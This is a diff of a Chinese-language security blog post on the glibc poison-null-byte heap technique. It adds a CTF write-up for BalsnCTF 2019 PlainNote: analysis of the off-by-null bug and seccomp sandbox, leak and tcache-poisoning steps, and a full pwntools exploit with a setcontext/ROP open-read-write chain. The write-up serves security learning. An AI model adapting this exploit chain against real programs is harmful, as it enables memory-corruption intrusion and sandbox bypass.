@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"akaieurus.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="之前学的时候有点云里雾里，画了一遍图觉得清楚多了（果然美术生就要画图(*σ´∀&#96;)σ）">
+  <meta name="description" content="之前学的时候有点云里雾里，画了一遍图觉得清楚多了（果然美术生就要画图(*σ´∀&#96;)σ）（例题做的真坐牢QAQ）">
 <meta property="og:type" content="article">
 <meta property="og:title" content="poison_null_byte">
 <meta property="og:url" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/index.html">
 <meta property="og:site_name" content="Eurus禁止摆烂！">
-<meta property="og:description" content="之前学的时候有点云里雾里，画了一遍图觉得清楚多了（果然美术生就要画图(*σ´∀&#96;)σ）">
+<meta property="og:description" content="之前学的时候有点云里雾里，画了一遍图觉得清楚多了（果然美术生就要画图(*σ´∀&#96;)σ）（例题做的真坐牢QAQ）">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/1.jpg">
 <meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/2.jpg">
@@ -33,8 +33,17 @@
 <meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/1-2.jpg">
 <meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/1-3.jpg">
 <meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/1-4.jpg">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/add.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/myputs.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/myprintf.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/readint.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/init.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/2-1.jpg">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/2-2.jpg">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/open.png">
+<meta property="og:image" content="http://akaieurus.github.io/2023/02/04/poison-null-byte/syscall.png">
 <meta property="article:published_time" content="2023-02-04T11:01:45.000Z">
-<meta property="article:modified_time" content="2023-02-04T20:15:29.496Z">
+<meta property="article:modified_time" content="2023-02-08T09:47:42.386Z">
 <meta property="article:author" content="Eurus">
 <meta property="article:tag" content="how2heap">
 <meta name="twitter:card" content="summary">
@@ -204,7 +213,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-02-05 04:15:29" itemprop="dateModified" datetime="2023-02-05T04:15:29+08:00">2023-02-05</time>
+                <time title="Modified: 2023-02-08 17:47:42" itemprop="dateModified" datetime="2023-02-08T17:47:42+08:00">2023-02-08</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -235,7 +244,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>之前学的时候有点云里雾里，画了一遍图觉得清楚多了（果然美术生就要画图(*σ´∀&#96;)σ）</p>
+        <p>之前学的时候有点云里雾里，画了一遍图觉得清楚多了（果然美术生就要画图(*σ´∀&#96;)σ）（例题做的真坐牢QAQ）</p>
 <span id="more"></span>
 <h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>如果对输入长度检查不严，导致chunk中内容输入多了一个零字节溢出至next chunk的size最低位，改变next chunk的size的大小<br>主要作用就是改变next chunk的preinuse位触发合并和造成堆块错位</p>
 <h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="2-26以前"><a href="#2-26以前" class="headerlink" title="2.26以前"></a>2.26以前</h4><p>实验代码如下（来自how2heap）：</p>
@@ -262,7 +271,31 @@ ps：像是形成一个三明治结构（二三层间得有个缝），然后控
 <img src="/2023/02/04/poison-null-byte/1-3.jpg" class title="步骤三"></li>
 <li>of by null触发victim的向下合并，这时我们可以通过prev2控制victim2的头部<img src="/2023/02/04/poison-null-byte/1-4.jpg" class title="步骤四"></li>
 </ul>
+<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="BalsnCTF-2019-PlainNote（2-29）"><a href="#BalsnCTF-2019-PlainNote（2-29）" class="headerlink" title="BalsnCTF 2019-PlainNote（2.29）"></a>BalsnCTF 2019-PlainNote（2.29）</h4><p>高版本的of by null，做的是真坐牢，但收获也不少。没找到2.29的libc所以用的2.31</p>
+<h5 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h5><p>静态分析不难，需要注意的就是add函数中存在of by null漏洞，会在输入最后加一个空字符，在存在漏洞的同时也使泄露地址变得困难</p>
+<img src="/2023/02/04/poison-null-byte/add.png" class title="add">
+<p>以及本题存在沙箱，需要用orw读取flag</p>
 
+<p>沙箱是白名单形式的，只允许read、write、open和exit的系统调用，程序中所有的输入输出都是通过read和write实现的</p>
+<img src="/2023/02/04/poison-null-byte/myputs.png" class title="myputs">
+<img src="/2023/02/04/poison-null-byte/myprintf.png" class title="myprintf">
+<img src="/2023/02/04/poison-null-byte/readint.png" class title="readint">
+<p>输出会用strlen取输出的字节数，而strlen是通过空字符确定长度的，所以不可能通过连带的方式泄露地址</p>
+<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>主要流程有四步：</p>
+<ul>
+<li>泄露libc基址</li>
+<li>泄露heap地址</li>
+<li>执行of by null</li>
+<li>进行orw<br>执行of by null按照实验代码执行就行，orw用gadget+setcontext模板就行，主要难点在于泄露地址，所以of by null的步骤得进行一定的改进<br>由于堆的基址会保持页对齐即0x1000对齐，但进行b’\x00\x10’覆盖时会把第四位也覆盖为0，所以只有当我们的prev chunk的地址的第四位为0时才能覆盖成功，也就是说在开启aslr的情况下存在一个1&#x2F;16的爆破（本地做的时候可以先关闭aslr）</li>
+<li>由于init函数会使heap非常的混乱所以可以先把bin清空<img src="/2023/02/04/poison-null-byte/init.png" class title="init"></li>
+<li>首先在最开始堆布局的时候prev上再加两个0x20的chunk，这样of by null之后的堆布局如下所示：<img src="/2023/02/04/poison-null-byte/2-1.jpg" class title="步骤一">
+其中prev3用于of by null更改victim的presize和preinuse，prev2用于泄露</li>
+<li>在of by null结束之后申请一个0x4f0的chunk，这样我们就能通过prev2利用show函数打印fd指针<br>由于我们需要泄露libc基址和heap两个地址，所以我们要先申请回0x530的chunk，然后释放一个unsorted bin范围的chunk（pad），再释放0x530的chunk，这样prev2的fd指向一个heap地址pad，再申请回pad，prev2的fd就指向unsorted bin<img src="/2023/02/04/poison-null-byte/2-2.jpg" class title="步骤二"></li>
+<li>然后我们可可以从prev2中再切下来一个tcache范围内的chunk，通过打tcache执行orw</li>
+<li>orw时需要注意一点，直接执行open函数时实际调用的syscall是0x101，会被沙箱ban掉<img src="/2023/02/04/poison-null-byte/open.png" class title="open">
+所以要通过rax进行syscall，这里选用的是time函数和timelocal函数中间的sub_D3F40<img src="/2023/02/04/poison-null-byte/syscall.png" class title="syscall"></li>
+</ul>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,content):</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Choice: &#x27;</span>,b<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Size: &#x27;</span>,str(size).encode())</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">def <span class="built_in">remove</span>(index):</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Choice: &#x27;</span>,b<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Idx: &#x27;</span>,str(index).encode())</span><br><span class="line">def show(index):</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Choice: &#x27;</span>,b<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(b<span class="string">&#x27;Idx: &#x27;</span>,str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span>=process(&#x27;./note&#x27;)</span><br><span class="line"><span class="attribute">libc</span>=ELF(&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):#0-15</span><br><span class="line">    <span class="built_in">add</span>(0x10,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):#16-31</span><br><span class="line">    <span class="built_in">add</span>(0x60,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(9):#32-40</span><br><span class="line">    <span class="built_in">add</span>(0x70,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(5):#41-45</span><br><span class="line">    <span class="built_in">add</span>(0xc0,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(2):#46-47</span><br><span class="line">    <span class="built_in">add</span>(0xe0,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(0xcf0,b<span class="string">&#x27;Q&#x27;</span>)#48</span><br><span class="line"><span class="built_in">add</span>(0x500,b<span class="string">&#x27;Q&#x27;</span>)#prev_1(49)</span><br><span class="line"><span class="built_in">add</span>(0x10,b<span class="string">&#x27;Q&#x27;</span>)#prev_2(50)</span><br><span class="line"><span class="built_in">add</span>(0x10,b<span class="string">&#x27;Q&#x27;</span>)#prev_3(51)</span><br><span class="line"><span class="built_in">add</span>(0x4f0,b<span class="string">&#x27;Q&#x27;</span>)#victim(52)</span><br><span class="line"><span class="built_in">add</span>(0x10,b<span class="string">&#x27;Q&#x27;</span>)#padding(53)</span><br><span class="line"><span class="built_in">add</span>(0x4f0,b<span class="string">&#x27;Q&#x27;</span>)#a(54)</span><br><span class="line"><span class="built_in">add</span>(0x10,b<span class="string">&#x27;Q&#x27;</span>)#padding(55)</span><br><span class="line"><span class="built_in">add</span>(0x510,b<span class="string">&#x27;Q&#x27;</span>)#b(56)</span><br><span class="line"><span class="built_in">add</span>(0x10,b<span class="string">&#x27;Q&#x27;</span>)#padding(57)</span><br><span class="line"><span class="built_in">remove</span>(49)</span><br><span class="line"><span class="built_in">remove</span>(54)</span><br><span class="line"><span class="built_in">remove</span>(56)</span><br><span class="line"><span class="built_in">add</span>(0x1000,b<span class="string">&#x27;Q&#x27;</span>)#49</span><br><span class="line"><span class="built_in">add</span>(0x1000,b<span class="string">&#x27;Q&#x27;</span>)#padding(58)</span><br><span class="line"><span class="built_in">add</span>(0x500,p64(0)+b<span class="string">&#x27;\x41\x05\x00\x00\x00\x00\x00&#x27;</span>)#prev1_1(54)</span><br><span class="line"><span class="built_in">add</span>(0x510,b<span class="string">&#x27;\x10&#x27;</span>)#b2(56)</span><br><span class="line"><span class="built_in">add</span>(0x4f0,b<span class="string">&#x27;Q&#x27;</span>)#a2(59)</span><br><span class="line"><span class="built_in">remove</span>(59)</span><br><span class="line"><span class="built_in">remove</span>(52)</span><br><span class="line"><span class="built_in">add</span>(0x4f0,p64(0)+b<span class="string">&#x27;\x10&#x27;</span>)#a3(52)</span><br><span class="line"><span class="built_in">add</span>(0x4f0,b<span class="string">&#x27;\x00&#x27;</span>)#victim2(59)</span><br><span class="line"><span class="built_in">remove</span>(51)</span><br><span class="line"><span class="built_in">add</span>(0x18,b<span class="string">&#x27;\x00&#x27;</span><span class="number">*0</span>x10+p64(0x540))#prev1_2(51)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="built_in">remove</span>(59)</span><br><span class="line"><span class="built_in">add</span>(0x4f0,b<span class="string">&#x27;Q&#x27;</span>)#prev1_1(59)</span><br><span class="line"><span class="built_in">add</span>(0x530,b<span class="string">&#x27;Q&#x27;</span>)#60</span><br><span class="line"><span class="built_in">remove</span>(49)</span><br><span class="line"><span class="built_in">remove</span>(60)</span><br><span class="line">show(50)</span><br><span class="line"><span class="attribute">s</span>=p.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="attribute">heap</span>=u64(s)-0x14d0+0xa80</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap:&quot;</span>,hex(heap))</span><br><span class="line"><span class="built_in">add</span>(0x1000,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line">show(50)</span><br><span class="line"><span class="attribute">s</span>=p.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(8,b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="attribute">libcbase</span>=u64(s)-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-0x10-96</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libcbase:&quot;</span>,hex(libcbase))</span><br><span class="line"><span class="built_in">add</span>(0x530,p64(0)<span class="number">*3</span>+p64(0x20))#60</span><br><span class="line"><span class="built_in">remove</span>(53)</span><br><span class="line"><span class="built_in">remove</span>(51)</span><br><span class="line"><span class="attribute">free_hook</span>=libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">remove</span>(60)</span><br><span class="line"><span class="built_in">add</span>(0x530,p64(0)<span class="number">*3</span>+p64(0x20)+p64(free_hook))</span><br><span class="line"><span class="built_in">remove</span>(52)#a3(orw)</span><br><span class="line"><span class="attribute">gadget</span>=libcbase+0x1547a0</span><br><span class="line"><span class="attribute">setcontext_addr</span>=libcbase+0x580dd</span><br><span class="line"><span class="attribute">ret_addr</span>=libcbase+0x25679</span><br><span class="line"><span class="attribute">write_addr</span>=libcbase+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="attribute">open_addr</span>=libcbase+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="attribute">read_addr</span>=libcbase+libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="attribute">pop_rdi_addr</span>=libcbase+0x26b72</span><br><span class="line"><span class="attribute">pop_rsi_addr</span>=libcbase+0x27529</span><br><span class="line"><span class="attribute">pop_rdx_r12_addr</span>=libcbase+0x11c1e1</span><br><span class="line"><span class="attribute">pop_rax_addr</span>=libcbase+0x4a550</span><br><span class="line"><span class="attribute">syscall_addr</span>=libcbase+0xd3f49</span><br><span class="line"><span class="attribute">payload</span>=b&#x27;./flag\x00\x00&#x27;+p64(heap)+p64(0)*2+p64(setcontext_addr)+b&#x27;\x00&#x27;*(0xa0-0x28)+p64(heap+0x100)+p64(ret_addr)+b&#x27;\x00&#x27;*(0x100-0xb0)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(heap)+p64(pop_rsi_addr)+p64(0)+p64(pop_rax_addr)+p64(2)+p64(syscall_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(3)+p64(pop_rsi_addr)+p64(heap+0x300)+p64(pop_rdx_r12_addr)+p64(0x50)+p64(0)+p64(read_addr)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(1)+p64(pop_rsi_addr)+p64(heap+0x300)+p64(pop_rdx_r12_addr)+p64(0x50)+p64(0)+p64(write_addr)</span><br><span class="line"><span class="built_in">add</span>(0x4f0,payload)</span><br><span class="line"><span class="built_in">add</span>(0x10,b<span class="string">&#x27;Q&#x27;</span>)</span><br><span class="line"><span class="built_in">add</span>(0x10,p64(gadget))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">remove</span>(52)</span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
     </div>
 
     
@@ -283,7 +316,10 @@ ps：像是形成一个三明治结构（二三层间得有个缝），然后控
     <a href="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/" rel="prev" title="2023西湖论剑初赛pwn wp">
       <i class="fa fa-chevron-left"></i> 2023西湖论剑初赛pwn wp
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2023/02/05/house-of-lore/" rel="next" title="house of lore">
+      house of lore <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -342,7 +378,7 @@ ps：像是形成一个三明治结构（二三层间得有个缝），然后控
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-26%E4%BB%A5%E5%89%8D"><span class="nav-number">2.1.</span> <span class="nav-text">2.26以前</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-26-2-28"><span class="nav-number">2.2.</span> <span class="nav-text">2.26-2.28</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-28%E4%BB%A5%E5%90%8E"><span class="nav-number">2.3.</span> <span class="nav-text">2.28以后</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-26%E4%BB%A5%E5%89%8D"><span class="nav-number">2.1.</span> <span class="nav-text">2.26以前</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-26-2-28"><span class="nav-number">2.2.</span> <span class="nav-text">2.26-2.28</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-28%E4%BB%A5%E5%90%8E"><span class="nav-number">2.3.</span> <span class="nav-text">2.28以后</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">3.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#BalsnCTF-2019-PlainNote%EF%BC%882-29%EF%BC%89"><span class="nav-number">3.1.</span> <span class="nav-text">BalsnCTF 2019-PlainNote（2.29）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">3.1.1.</span> <span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">3.1.2.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#exp"><span class="nav-number">3.1.3.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -358,20 +394,20 @@ ps：像是形成一个三明治结构（二三层间得有个缝），然后控
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
